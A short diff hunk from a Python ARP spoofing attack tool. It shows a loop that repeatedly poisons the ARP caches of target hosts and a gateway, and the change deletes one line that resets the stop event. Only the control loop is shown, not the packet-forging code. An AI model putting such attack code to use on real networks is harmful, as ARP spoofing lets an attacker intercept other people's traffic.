@@ -30,7 +30,6 @@ def arp_spoof_attack(target_ips, gateway_ip):
     if isinstance(target_ips, str):
         target_ips = [target_ips]
     print(f"[*] Starting ARP spoofing attack on targets: {target_ips} and gateway: {gateway_ip}")
-    _stop_event.clear()
     while not _stop_event.is_set():
         for target_ip in target_ips:
             arp_spoof(target_ip, gateway_ip)
